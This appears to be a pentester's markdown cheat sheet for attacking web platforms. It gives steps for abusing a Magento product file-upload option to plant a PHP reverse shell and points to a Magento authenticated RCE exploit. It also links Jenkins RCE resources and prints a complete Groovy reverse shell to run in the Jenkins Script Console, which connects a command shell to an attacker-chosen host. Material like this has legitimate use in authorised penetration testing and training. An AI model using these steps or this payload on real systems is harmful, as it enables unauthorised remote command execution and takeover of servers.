# WordPress

# Magento 
## Create a Misconfiguration 
1. Go to "Manage Products" (from catalog menu)
2. Choose a Product / Create a Product
3. Click "Add New Option"
- Fill Out:
  - Title: TITLE
  - Input Type: File
  - Is Required: Yes
  - Allowed File Extensions: 
4. Back to the Website: Click the item and add a php reverse shell
## Magento CE < 1.9.0.1 - (Autenticated)  Remote Code Execution
Search for new version on github and execute with a bash reverse shell call
# Jenkins
An open-source automation server used for continuous integration and continuous delivery. It automates the building, testing, and deployment of software applications by integrating various DevOps tools and pipelines. Jenkins supports a wide range of plugins that extend its functionality, making it highly customizable for different workflows and environments.
## Resources
- [A handbook including multiple ways of gaining Jenkins RCE's](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)
- [A repository similar to the above, including links to scripts and tools](https://github.com/gquere/pwn_jenkins)
## Jenkins Script Console 
1) Navigate to the Jenkins Script Console:
  -  http://<IP>:<PORT>/script
  -  Manage Jenkins > Script Console
2) Run Groovy Reverse Shell Script
```
String host="<IP>";
int port=<PORT>;
String cmd="cmd.exe or /bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

